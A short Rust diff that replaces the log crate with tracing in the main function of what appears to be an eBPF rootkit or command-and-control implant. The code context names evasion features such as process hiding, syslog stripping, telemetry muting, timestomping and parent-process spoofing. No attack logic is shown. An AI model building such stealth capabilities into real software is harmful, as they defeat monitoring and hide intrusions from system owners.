@@ -20,7 +20,7 @@ use common::{
     EVENT_PACKET_INTERCEPTED, EVENT_PROC_HIDDEN, EVENT_SOCKET_CLONED, EVENT_SYSLOG_STRIPPED,
     EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
 };
-use log::{debug, error, info, warn};
+use tracing::{debug, error, info, warn};
 use offense::{parse_spoof_ppid, parse_timestomp, parse_tty_device};
 use std::fs;
 use std::path::Path;
@@ -118,10 +118,15 @@ struct C2Maps {
 async fn main() -> Result<()> {
     let cli = Cli::parse();
 
-    env_logger::Builder::from_env(
-        env_logger::Env::default().default_filter_or(if cli.verbose { "debug" } else { "info" }),
-    )
-    .init();
+    tracing_subscriber::fmt()
+        .with_env_filter(
+            tracing_subscriber::EnvFilter::try_from_default_env()
+                .unwrap_or_else(|_| {
+                    tracing_subscriber::EnvFilter::new(if cli.verbose { "debug" } else { "info" })
+                }),
+        )
+        .with_target(false)
+        .init();
 
     // Bump the memlock rlimit for eBPF
     let rlim = libc::rlimit {
